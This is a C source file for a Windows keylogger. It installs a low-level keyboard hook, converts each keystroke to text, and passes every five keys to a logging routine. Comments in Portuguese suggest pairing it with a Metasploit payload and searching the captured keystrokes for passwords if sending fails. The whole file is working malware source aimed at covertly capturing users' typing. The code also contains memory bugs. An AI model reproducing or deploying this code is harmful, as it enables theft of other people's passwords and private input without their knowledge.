#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdbool.h>
#include "log.h"
#pragma comment(lib,"user32.lib") 
#define LIMITE_TECLAS 5
int iniciaThread(char* argv[]);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
int capsLockAtivado(void);
struct lista* lst = NULL;
int contadorTeclas = 0;
//Sugestão payload: metaexploit
//se nao conseguir enviar, tentar identificar senhas nas teclagens

int iniciaThread(char* argv[]) {
	lst = NULL;
	HANDLE thread;
	
	thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,
		(LPVOID)argv[0], 0, NULL);

	if (thread)
	{
		return WaitForSingleObject(thread, INFINITE);
	}
	return 1;
}

DWORD WINAPI KeyLogger(LPVOID lpParameter) {
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe)
	{
		return 1;
	}
	else
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);

		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

		MSG msg;

		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			if (msg.message == WM_HOTKEY)
			{
				UnhookWindowsHookEx(hKeyHook);
				return 0;
			}
			
			TranslateMessage(&msg);
			
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;
}

LRESULT CALLBACK
LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char val[5];
	DWORD dwMsg = 1;
	char* string = (char*)malloc(sizeof(char) * 20);
	unsigned int code = 0;
	switch (wParam) {
		case WM_KEYDOWN:
			DWORD vkCode = pKeyBoard->vkCode;
			code = (unsigned int)vkCode;
			if ((vkCode >= 39) && (vkCode <= 64)) //teclas 0-9
			{
				// shift ativado
				if (GetAsyncKeyState(VK_SHIFT)) // Verifica se a tecla shift está pressionada
				{
					switch (vkCode)
						// Caracteres 0-9
					{
					case 0x30:
						
						printf(")");
						strcpy(string, ")");
						break;
					case 0x31:
						printf("!");
						strcpy(string, "!");
						break;
					case 0x32:
						printf("@");
						strcpy(string, "@");
						break;
					case 0x33:
						printf("#");
						strcpy(string, "#");
						break;
					case 0x34:
						printf("$");
						strcpy(string, "$");
						break;
					case 0x35:
						printf("%%");
						strcpy(string, "%%");
						break;
					case 0x36:
						printf("^");
						strcpy(string, "^");
						break;
					case 0x37:
						printf("&");
						strcpy(string, "&");
						break;
					case 0x38:
						printf("*");
						strcpy(string, "*");
						break;
					case 0x39:
						printf("(");
						strcpy(string, "(");
						break;
					}
					
				}
				else // Se a tecla shift não está pressionada
				{
					char* str = (char*)malloc(sizeof(char));
					str[0] = (char)code;
					str[1] = '\0';
					strcpy(string, str);
					printf("%c",(int) vkCode);
				}
				lst = inserir(lst, string);
			}
			else if ((vkCode > 64) && (vkCode < 91)) // Teclas a-z
			{
				if (!(GetAsyncKeyState(VK_SHIFT) ^ capsLockAtivado())) // Verifica se as letras devem ser minúsculas
				{
					vkCode += 32; // Converte letras em minúscula
				}
				printf( "%c", vkCode);
				char* str = (char*)malloc(sizeof(char));
				unsigned int teste = (unsigned int)vkCode;
				str[0] =(char) teste ;
				str[1] = '\0';
				lst = inserir(lst, str);
			}
			else // Outras teclas
			{
				switch (vkCode)
					// Verifica outras teclas
				{
				case VK_CANCEL:
					printf("[Cancel]");
					strcpy(string, "[Cancel]");
					break;
				case VK_SPACE:
					printf(" ");
					strcpy(string, " ");
					break;
				case VK_LCONTROL:
					printf("[LCtrl]");
					strcpy(string, "[LCtrl]");
					break;
				case VK_RCONTROL:
					printf("[RCtrl]");
					strcpy(string, "[RCtrl]");
					break;
				case VK_LMENU:
					printf("[LAlt]");
					strcpy(string, "[LAlt]");
					break;
				case VK_RMENU:
					printf("[RAlt]");
					strcpy(string, "[RAlt]");
					break;
				case VK_LWIN:
					printf("[LWindows]");
					strcpy(string, "[LWindows]");
					break;
				case VK_RWIN:
					printf("[RWindows]");
					strcpy(string, "[RWindows]");
					break;
				case VK_APPS:
					printf("[Applications]");
					strcpy(string, "[Applications]");
					break;
				case VK_SNAPSHOT:
					printf("[PrintScreen]");
					strcpy(string, "[PrintScreen]");
					break;
				case VK_INSERT:
					printf("[Insert]");
					strcpy(string, "[Insert]");
					break;
				case VK_PAUSE:
					printf("[Pause]");
					strcpy(string, "[Pause]");
					break;
				case VK_VOLUME_MUTE:
					printf("[VolumeMute]");
					strcpy(string, "[VolumeMute]");
					break;
				case VK_VOLUME_DOWN:
					printf("[VolumeDown]");
					strcpy(string, "[VolumeDown]");
					break;
				case VK_VOLUME_UP:
					printf("[VolumeUp]");
					strcpy(string, "[VolumeUp]");
					break;
				case VK_SELECT:
					printf("[Select]");
					strcpy(string, "[Select]");
					break;
				case VK_HELP:
					printf("[Help]");
					strcpy(string, "[Help]");
					break;
				case VK_EXECUTE:
					printf("[Execute]");
					strcpy(string, "[Execute]");
					break;
				case VK_DELETE:
					printf("[Delete]");
					strcpy(string, "[Delete]");
					break;
				case VK_CLEAR:
					printf("[Clear]");
					strcpy(string, "[Clear]");
					break;
				case VK_RETURN:
					printf("[Enter]");
					strcpy(string, "[Enter]");
					break;
				case VK_BACK:
					printf("[Backspace]");
					strcpy(string, "[Backspace]");
					break;
				case VK_TAB:
					printf("[Tab]");
					strcpy(string, "[Tab]");
					break;
				case VK_ESCAPE:
					printf("[Escape]");
					strcpy(string, "[Escape]");
					break;
				case VK_LSHIFT:
					printf("[LShift]");
					strcpy(string, "[LShift]");
					break;
				case VK_RSHIFT:
					printf("[RShift]");
					strcpy(string, "[RShift]");
					break;
				case VK_CAPITAL:
					printf("[CapsLock]");
					strcpy(string, "[CapsLock]");
					break;
				case VK_NUMLOCK:
					printf("[NumLock]");
					strcpy(string, "[NumLock]");
					break;
				case VK_SCROLL:
					printf("[ScrollLock]");
					strcpy(string, "[ScrollLock]");
					break;
				case VK_HOME:
					printf("[Home]");
					strcpy(string, "[Home]");
					break;
				case VK_END:
					printf("[End]");
					strcpy(string, "[End]");
					break;
				case VK_PLAY:
					printf("[Play]");
					strcpy(string, "[Play]");
					break;
				case VK_ZOOM:
					printf("[Zoom]");
					strcpy(string, "[Zoom]");
					break;
				case VK_DIVIDE:
					printf("[/]");
					strcpy(string, "[/]");
					break;
				case VK_MULTIPLY:
					printf("[*]");
					strcpy(string, "[*]");
					break;
				case VK_SUBTRACT:
					printf("[-]");
					strcpy(string, "[-]");
					break;
				case VK_ADD:
					printf("[+]");
					strcpy(string, "[+]");
					break;
				case VK_PRIOR:
					printf("[PageUp]");
					strcpy(string, "[PageUp]");
					break;
				case VK_NEXT:
					printf("[PageDown]");
					strcpy(string, "[PageDown]");
					break;
				case VK_LEFT:
					printf("[LArrow]");
					strcpy(string, "[LArrow]");
					break;
				case VK_RIGHT:
					printf("[RArrow]");
					strcpy(string, "[RArrow]");
					break;
				case VK_UP:
					printf("[UpArrow]");
					strcpy(string, "[UpArrow]");
					break;
				case VK_DOWN:
					printf("[DownArrow]");
					strcpy(string, "[DownArrow]");
					break;
				case VK_NUMPAD0:
					printf("[0]");
					strcpy(string, "[0]");
					break;
				case VK_NUMPAD1:
					printf("[1]");
					strcpy(string, "[1]");
					break;
				case VK_NUMPAD2:
					printf("[2]");
					strcpy(string, "[2]");
					break;
				case VK_NUMPAD3:
					printf("[3]");
					strcpy(string, "[3]");
					break;
				case VK_NUMPAD4:
					printf("[4]");
					strcpy(string, "[4]");
					break;
				case VK_NUMPAD5:
					printf("[5]");
					strcpy(string, "[5]");
					break;
				case VK_NUMPAD6:
					printf("[6]");
					strcpy(string, "[6]");
					break;
				case VK_NUMPAD7:
					printf("[7]");
					strcpy(string, "[7]");
					break;
				case VK_NUMPAD8:
					printf("[8]");
					strcpy(string, "[8]");
					break;
				case VK_NUMPAD9:
					printf("[9]");
					strcpy(string, "[9]");
					break;
				case VK_F1:
					printf("[F1]");
					strcpy(string, "[F1]");
					break;
				case VK_F2:
					printf("[F2]");
					strcpy(string, "[F2]");
					break;
				case VK_F3:
					printf("[F3]");
					strcpy(string, "[F3]");
					break;
				case VK_F4:
					printf("[F4]");
					strcpy(string, "[F4]");
					break;
				case VK_F5:
					printf("[F5]");
					strcpy(string, "[F5]");
					break;
				case VK_F6:
					printf("[F6]");
					strcpy(string, "[F6]");
					break;
				case VK_F7:
					printf("[F7]");
					strcpy(string, "[F7]");
					break;
				case VK_F8:
					printf("[F8]");
					strcpy(string, "[F8]");
					break;
				case VK_F9:
					printf("[F9]");
					strcpy(string, "[F9]");
					break;
				case VK_F10:
					printf("[F10]");
					strcpy(string, "[F10]");
					break;
				case VK_F11:
					printf("[F11]");
					strcpy(string, "[F11]");
					break;
				case VK_F12:
					printf("[F12]");
					strcpy(string, "[F12]");
					break;
				case VK_F13:
					printf("[F13]");
					strcpy(string, "[F13]");
					break;
				case VK_F14:
					printf("[F14]");
					strcpy(string, "[F14]");
					break;
				case VK_F15:
					printf("[F15]");
					strcpy(string, "[F15]");
					break;
				case VK_F16:
					printf("[F16]");
					strcpy(string, "[F16]");
					break;
				case VK_F17:
					printf("[F17]");
					strcpy(string, "[F17]");
					break;
				case VK_F18:
					printf("[F18]");
					strcpy(string, "[F18]");
					break;
				case VK_F19:
					printf("[F19]");
					strcpy(string, "[F19]");
					break;
				case VK_F20:
					printf("[F20]");
					strcpy(string, "[F20]");
					break;
				case VK_F21:
					printf("[F21]");
					strcpy(string, "[F21]");
					break;
				case VK_F22:
					printf("[F22]");
					strcpy(string, "[F22]");
					break;
				case VK_F23:
					printf("[F23]");
					strcpy(string, "[F23]");
					break;
				case VK_F24:
					printf("[F24]");
					strcpy(string, "[F24]");
					break;
				case VK_OEM_2:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("?");
						strcpy(string, "?");
					}
					else {
						printf("/");
						strcpy(string, "/");
					}
						
					break;
				case VK_OEM_3:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("~");
						strcpy(string, "~");
					}
						
					else {
						printf("`");
						strcpy(string, "`");
					}
						
					break;
				case VK_OEM_4:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("{");
						strcpy(string, "{");
					}
						
					else {
						printf("[");
						strcpy(string, "[");
					}
						
					break;
				case VK_OEM_5:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("|");
						strcpy(string, "|");
					}
					else {
						printf("\\");
						strcpy(string, "\\");
					}
						
					break;
				case VK_OEM_6:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("}");
						strcpy(string, "}");
					}
					else {
						printf("]");
						strcpy(string, "]");
					}
						
					break;
				case VK_OEM_7:
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("\\");
						strcpy(string, "\\");
					}
					else {
						printf("'");
						strcpy(string, "'");
					}
					break;
				case 0xBC:                //vírgula
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("<");
						strcpy(string, "<");
					}
						
					else {
						printf(",");
						strcpy(string, ",");
					}
						
					break;
				case 0xBE:              //ponto
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf(">");
						strcpy(string, ">");
					}
						
					else {
						printf(".");
						strcpy(string, ".");
					}
						
					break;
				case 0xBA:              //Barra
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf(":");
						strcpy(string, ":");
					}
						
					else {
						printf(";");
						strcpy(string, ";");
					}
						
					break;
				case 0xBD:              //menos
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("_");
						strcpy(string, "_");
					}
					else {
						printf("-");
						strcpy(string, "-");
					}
					break;
				case 0xBB:              //igual
					if (GetAsyncKeyState(VK_SHIFT)) {
						printf("+");
						strcpy(string, "+");
					}
					else {
						printf("=");
						strcpy(string, "=");
					}
						
					break;
				default:

					dwMsg += pKeyBoard->scanCode << 16;
					dwMsg += pKeyBoard->flags << 24;

					char key[16];
					GetKeyNameText(dwMsg, key, 15);
					printf("%s", key);
					strcpy(string, key);
				}
				lst = inserir(lst, string);
			}
			contadorTeclas++;
			if (contadorTeclas == LIMITE_TECLAS) {
				log(lst);
				contadorTeclas = 0;
				free(lst);
				lst = NULL;
			}
			break;
			
		default:
			return CallNextHookEx(NULL, nCode, wParam, lParam);
			break;

	}
	
	return 0;
}

int capsLockAtivado(void)
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}